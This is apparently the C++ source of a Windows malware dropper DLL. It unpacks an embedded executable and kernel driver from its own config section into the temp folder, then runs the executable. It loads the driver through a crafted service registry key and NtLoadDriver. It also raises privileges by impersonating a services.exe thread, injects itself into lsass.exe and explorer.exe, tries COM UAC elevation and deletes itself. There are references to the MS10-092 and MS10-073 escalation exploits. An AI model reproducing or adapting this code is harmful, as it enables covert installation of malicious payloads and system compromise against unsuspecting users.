#include <windows.h>
#include <stdio.h>

#include <shlwapi.h>
#include <shlobj.h>

#include "ntdll.h"
#include "rc4.h"
#include "secconfig.h"
#include "inet.h"
#include "utils.h"
#include "splice.h"

#include "spooler/spooler.h"
#include "spooler/antiav.h"
#include "ms10_092/ms10_092.h"
#include "ms10_073/ms10_073.h"
#include "inject/inject.h"
#include "com_elevation/com_elevation.h"
#include "xstring.h"
#include "secconfig.h"

#define MAIN_WORK_PROCESS	"lsass.exe"

CHAR g_chDllPath[MAX_PATH] = {0};
CHAR g_chExePath[MAX_PATH] = {0};

PVOID g_pvImageBase = NULL;
DWORD g_dwImageSize = 0;

BOOL g_bAdmin = FALSE;
BOOL g_bUAC = FALSE;
BOOL g_bInject = FALSE;
HANDLE g_hMutex = 0;

PVOID g_MainImage = NULL;

typedef struct
{
	DWORD dwExeSize;
	DWORD dwSysSize;
}
DROPPER_PARAMS, *PDROPPER_PARAMS;

BOOL GetConfigFiles(PVOID *ppvExe, PDWORD pdwExe, PVOID *ppvSys, PDWORD pdwSys)
{
	BOOL bRet = FALSE;
	PDROPPER_PARAMS pDropperParams;
	PVOID pvData;
	DWORD dwDataSize;

	if (GetSectionConfigData(GetMyBase(), &pvData, &dwDataSize))
	{
		if (dwDataSize >= sizeof(DROPPER_PARAMS))
		{
			pDropperParams = (PDROPPER_PARAMS)pvData;

			*ppvExe = malloc(pDropperParams->dwExeSize);
			if (*ppvExe)
			{
				CopyMemory(*ppvExe, RtlOffsetToPointer(pvData, sizeof(DROPPER_PARAMS)), pDropperParams->dwExeSize);
				*pdwExe = pDropperParams->dwExeSize;

				*ppvSys = malloc(pDropperParams->dwSysSize);
				if (*ppvSys)
				{
					CopyMemory(*ppvSys, RtlOffsetToPointer(pvData, sizeof(DROPPER_PARAMS) + pDropperParams->dwExeSize), pDropperParams->dwSysSize);
					*pdwSys = pDropperParams->dwSysSize;

					bRet = TRUE;
				}

				if (!bRet) free(*ppvExe);
			}
		}

		free(pvData);
	}

	return bRet;
}

BOOL GetPrivilege(ULONG Priviliage)
{
	BOOL bRet = FALSE;
	NTSTATUS St;
	BOOLEAN bEnable;

	bRet = NT_SUCCESS(RtlAdjustPrivilege(Priviliage,TRUE,FALSE,&bEnable)) || NT_SUCCESS(RtlAdjustPrivilege(Priviliage,TRUE,TRUE,&bEnable));
	if (!bRet)
	{
		PSYSTEM_PROCESSES_INFORMATION Processes = (PSYSTEM_PROCESSES_INFORMATION)GetSystemInformation(SystemProcessInformation);
		if (Processes)
		{
			UNICODE_STRING ProcessName = RTL_CONSTANT_STRING(L"services.exe");

			for (PSYSTEM_PROCESSES_INFORMATION Proc=Processes; ; *(ULONG*)&Proc += Proc->NextEntryDelta)
			{
				if (RtlEqualUnicodeString(&Proc->ProcessName,&ProcessName,TRUE))
				{
					HANDLE hThread;
					OBJECT_ATTRIBUTES ObjAttr;

					InitializeObjectAttributes(&ObjAttr,NULL,0,0,0);
					St = NtOpenThread(&hThread,THREAD_DIRECT_IMPERSONATION,&ObjAttr,&Proc->Threads[0].ClientId);
					if (NT_SUCCESS(St))
					{
						SECURITY_QUALITY_OF_SERVICE SecurityQos = {0};

						SecurityQos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
						SecurityQos.ImpersonationLevel = SecurityImpersonation;
						SecurityQos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;

						St = NtImpersonateThread(NtCurrentThread(),hThread,&SecurityQos);
						if (NT_SUCCESS(St))
						{
							St = RtlAdjustPrivilege(Priviliage,TRUE,TRUE,&bEnable);
							bRet = NT_SUCCESS(St);
							if (!bRet)
							{
								DbgPrint(__FUNCTION__"(): RtlAdjustPrivilege failed with status %x\n",St);
							}
						}
						else
						{
							DbgPrint(__FUNCTION__"(): NtImpersonateThread failed with status %x\n",St);
						}

						NtClose(hThread);
					}
					else
					{
						DbgPrint(__FUNCTION__"(): NtOpenThread failed with status %x\n",St);
					}

					break;
				}

				if (!Proc->NextEntryDelta) break;
			}

			free(Processes);
		}
	}

	return bRet;
}

VOID StartSys(LPCSTR chSysPath)
{
	NTSTATUS St;
	BOOL bRet = FALSE;
	HKEY hKey;
	CHAR chRegPath[MAX_PATH];
	WCHAR wcLoadDrv[MAX_PATH];
	CHAR chImagePath[MAX_PATH] = "\\??\\";
	UNICODE_STRING usStr;
	DWORD dwType;

	GetPrivilege(SE_LOAD_DRIVER_PRIVILEGE);

	DbgPrint(__FUNCTION__"(): driver path '%s'\n",chSysPath);

	DWORD dwId = GetTickCount();

	_snprintf(chRegPath,RTL_NUMBER_OF(chRegPath)-1,"system\\currentcontrolset\\services\\%x", dwId);
	_snwprintf(wcLoadDrv,RTL_NUMBER_OF(wcLoadDrv)-1,L"\\registry\\machine\\system\\currentcontrolset\\services\\%x", dwId);

	strncat(chImagePath,chSysPath,sizeof(chImagePath));
	if (RegCreateKey(HKEY_LOCAL_MACHINE,chRegPath,&hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey,"ImagePath",0,REG_SZ,(LPBYTE)&chImagePath,strlen(chImagePath)+1);

		dwType = SERVICE_KERNEL_DRIVER;
		RegSetValueEx(hKey,"Type",0,REG_DWORD,(LPBYTE)&dwType,sizeof(DWORD));

		dwType = SERVICE_DEMAND_START;
		RegSetValueEx(hKey,"Start",0,REG_DWORD,(LPBYTE)&dwType,sizeof(DWORD));

		RegCloseKey(hKey);

		RtlInitUnicodeString(&usStr,wcLoadDrv);
		St = NtLoadDriver(&usStr);

		DbgPrint(__FUNCTION__"(): NtLoadDriver status %x\n",St);
	}
	else
	{
		DbgPrint(__FUNCTION__"(): RegCreateKey last error %x\n",GetLastError());
	}
}

VOID StartExe(LPSTR lpFilePath)
{
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};

	si.cb = sizeof(si);

	BOOL bRet = CreateProcess(NULL,lpFilePath,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
	if (bRet)
	{
		DbgPrint(__FUNCTION__"(): ALL OK\n");

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	else
	{
		DbgPrint(__FUNCTION__"(): CreateProcess failed last error %lx\n",GetLastError());
	}
}

DWORD MainWorkThread(PVOID pvContext)
{
	PVOID pvExe, pvSys;
	DWORD dwExe, dwSys;

	DbgPrint(__FUNCTION__"(): exe '%s' dll '%s'\n", g_chExePath, g_chDllPath);

	if (GetConfigFiles(&pvExe, &dwExe, &pvSys, &dwSys))
	{
		CHAR chFolderPath[MAX_PATH];
		CHAR chExe[MAX_PATH];
		CHAR chSys[MAX_PATH];

		GetTempPath(RTL_NUMBER_OF(chFolderPath)-1, chFolderPath);

		GetTempFileName(chFolderPath, NULL, GetTickCount(), chExe);
		PathRemoveExtension(chExe);
		PathAddExtension(chExe, ".exe");
		if (FileWrite(chExe, CREATE_ALWAYS, pvExe, dwExe))
		{
			DbgPrint(__FUNCTION__"(): start exe '%s'\n", chExe);

			StartExe(chExe);
		}

		GetTempFileName(chFolderPath, NULL, GetTickCount(), chSys);
		PathRemoveExtension(chSys);
		PathAddExtension(chSys, ".sys");
		if (FileWrite(chSys, CREATE_ALWAYS, pvSys, dwSys))
		{
			DbgPrint(__FUNCTION__"(): start sys '%s'\n", chSys);

			StartSys(chSys);
		}

		free(pvExe);
		free(pvSys);
	}

	return 0;
}

VOID InstallAll()
{
	MainWorkThread(0);
}

DWORD ExplorerWorkThread(PVOID pvContext)
{
	// try com elevation
	if (!CreateThreadAndWait(ComElevation, g_chDllPath, 10*60*1000))
	{
		// if failed work from explorer
		MainWorkThread(pvContext);
	}

	return 0;
}

BOOL DropperDllWork(HMODULE hDll,LPCSTR lpExePath)
{
	BOOL bRet = FALSE;
	LPTHREAD_START_ROUTINE ThreadRoutine = NULL;
	LPCSTR lpExeName = PathFindFileName(lpExePath);

	if (!_stricmp(MAIN_WORK_PROCESS,lpExeName))
	{
		ThreadRoutine = MainWorkThread;
	}
	else if (!_stricmp("explorer.exe",lpExeName))
	{
		// explorer
		ThreadRoutine = ExplorerWorkThread;
	}
	else if (!_stricmp("spoolsv.exe",lpExeName))
	{
		// inject worker process in other session
		if (!InjectProcess(MAIN_WORK_PROCESS,g_pvImageBase,g_dwImageSize,FALSE))
		{
			// add ref dll
			LoadLibrary(g_chDllPath);

			// if failed work from spooler
			ThreadRoutine = MainWorkThread;
		}
	}
	else if (!_stricmp("sysprep.exe",lpExeName))
	{
		// com elevation

		// inject worker process in other session
		InjectProcess(MAIN_WORK_PROCESS,g_pvImageBase,g_dwImageSize,FALSE);

		ExitProcess(ERROR_SUCCESS);
	}

	if (ThreadRoutine)
	{
		HANDLE hThread = CreateThread(NULL,0,ThreadRoutine,NULL,0,NULL);
		if (hThread)
		{
			bRet = TRUE;

			CloseHandle(hThread);
		}
	}

	return bRet;
}

BOOL DropperExeUser()
{
	BOOL Ret = FALSE;

	// inject explorer process in current session
	Ret = InjectProcess("explorer.exe",g_pvImageBase,g_dwImageSize,TRUE);

	return Ret;
}

BOOL DropperExeAdmin()
{
	BOOL bOk = FALSE;

	// setup rpc control port redirection
	PortFilterBypassHook();

	bOk = FALSE; //SpoolerBypass(g_chDllPath);
	if (!bOk)
	{
		// inject worker process in current session
		bOk = InjectProcess(MAIN_WORK_PROCESS,g_pvImageBase,g_dwImageSize,TRUE);
	}

	return bOk;
}

VOID PrepareFirstRun(LPCSTR lpExePath)
{
	CHAR chFolderPath[MAX_PATH];

	GetTempPath(RTL_NUMBER_OF(chFolderPath)-1, chFolderPath);

	GetTempFileName(chFolderPath, NULL, 0, g_chExePath);
	PathRemoveExtension(g_chExePath);
	PathAddExtension(g_chExePath, ".exe");
	CopyFileA(lpExePath, g_chExePath, FALSE);

	GetTempFileName(chFolderPath, NULL, 0, g_chDllPath);
	PathRemoveExtension(g_chDllPath);
	PathAddExtension(g_chDllPath, ".dll");
	CopyFileA(lpExePath, g_chDllPath, FALSE);
	SetFileDllFlag(g_chDllPath);
}

VOID DropperExeWork(LPCSTR lpExePath)
{
	BOOL bOk = FALSE;

	if (!CheckWow64())
	{
		PrepareFirstRun(lpExePath);
/*
		if (g_bAdmin)
		{
			if (!g_bUAC)
			{
				// try spooler
				bOk = DropperExeAdmin();
			}
		}

		if (!bOk)
		{	
			if (g_bUAC)
			{
				// try UAC task scheduler exploit
				//bOk = ExploitMS10_092(g_chExePath);
			}
		}

		if (!bOk)
		{
			if (!g_bAdmin)
			{
				// try Win32k keyboard layout exploit
				//if (ExploitMS10_073())
				//{
				//	bOk = DropperExeAdmin();
				//}
			}
		}

		if (!bOk)
		{
			// try inject
*/
			if (!DropperExeUser())
			{
				InstallAll();
			}
//		}

	}
}


VOID GetStaticInformation()
{
	MEMORY_BASIC_INFORMATION pMemInfo;

	VirtualQuery(GetStaticInformation,&pMemInfo,sizeof(pMemInfo));

	g_pvImageBase = pMemInfo.AllocationBase;
	g_dwImageSize = RtlImageNtHeader(pMemInfo.AllocationBase)->OptionalHeader.SizeOfImage;

	g_bAdmin = CheckAdmin();
	g_bUAC = CheckUAC();
}

VOID SelfDelete(LPCSTR ModuleFileName)
{
	CHAR TempPath[MAX_PATH];
	CHAR TempName[MAX_PATH];

	GetTempPath(RTL_NUMBER_OF(TempPath)-1,TempPath);
	GetTempFileName(TempPath,NULL,0,TempName);

	MoveFileEx(ModuleFileName, TempName, MOVEFILE_REPLACE_EXISTING);
	MoveFileEx(TempName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

BOOL g_bDll = TRUE;
HMODULE hCurrDll;

BOOL Entry(HMODULE hDll,DWORD dwReasonForCall,DWORD dwReserved)
{
	
	BOOL bRet = FALSE;
	CHAR chExePath[MAX_PATH];

	GetModuleFileName(NULL,chExePath,RTL_NUMBER_OF(chExePath)-1);

	GetStaticInformation();
/*
	if (hDll && dwReasonForCall == DLL_PROCESS_ATTACH)
	{
		// dll
		g_bDll = TRUE;
		g_bInject = dwReserved == 'FWPB';

		DbgPrint(__FUNCTION__"(): Dll: %x, Admin: %d, Uac: %d, Inject: %d\n",hDll,g_bAdmin,g_bUAC,g_bInject);

		bRet = DropperDllWork(hDll,chExePath);

		DbgPrint(__FUNCTION__"(): Dll end ret '%d'\n",bRet);
	}
	else if (!g_bDll)
	{
*/
		// exe
/*
		DbgPrint(__FUNCTION__"(): Exe: '%s', Admin: %d, Uac: %d\n",chExePath,g_bAdmin,g_bUAC);

		DropperExeWork(chExePath);

		SelfDelete(chExePath);

		DbgPrint(__FUNCTION__"(): Exe end\n");

//		ExitProcess(ERROR_SUCCESS);
//	}

//	return bRet;
*/	
	return TRUE;
}

#pragma comment(linker, "/def:DLL.def")

extern "C" __declspec(dllexport) BOOL __stdcall Start()
{
	/*
		g_bDll = TRUE;
		g_bInject = FALSE;//dwReserved == 'FWPB';
		CHAR chExePath[MAX_PATH];
	
		GetModuleFileName(NULL,chExePath,RTL_NUMBER_OF(chExePath)-1);

		DbgPrint(__FUNCTION__"(): Dll: %x, Admin: %d, Uac: %d, Inject: %d\n",hCurrDll,g_bAdmin,g_bUAC,g_bInject);

		BOOL bRet = DropperDllWork(hCurrDll,chExePath);

		DbgPrint(__FUNCTION__"(): Dll end ret '%d'\n",bRet);

		return bRet;
	*/
	
			CHAR chExePath[MAX_PATH];
	
		GetModuleFileName(NULL,chExePath,RTL_NUMBER_OF(chExePath)-1);

		DbgPrint(__FUNCTION__"(): Exe: '%s', Admin: %d, Uac: %d\n",chExePath,g_bAdmin,g_bUAC);

		DropperExeWork(chExePath);

		SelfDelete(chExePath);

		DbgPrint(__FUNCTION__"(): Exe end\n");
	
	return TRUE;
}

extern "C" __declspec(dllexport) BOOL __stdcall DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	hCurrDll = hModule;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

